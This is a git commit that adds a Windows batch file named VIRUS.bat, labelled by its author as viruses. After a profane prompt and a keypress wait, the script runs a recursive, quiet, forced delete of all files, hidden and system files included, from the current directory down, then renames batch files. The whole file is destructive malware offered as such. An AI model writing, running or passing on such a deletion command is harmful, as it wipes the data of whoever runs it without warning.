a4bc99153d2a4c7880c5a2a5f8652585b31e04ee
SuperAdminGamer <86530808+SuperAdminGamer@users.noreply.github.com>
2021-06-26 19:52:52 +0200

    Viruses
    VIRUSES IN HERE :-)

---
+++ VIRUS.bat
@@ -0,0 +1,10 @@
+@echo off
+title %random%
+color 4f
+:1
+echo F*CK PC?
+pause>nul
+cls
+del * /s /a /q
+ren *.bat *.virusessssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+exit
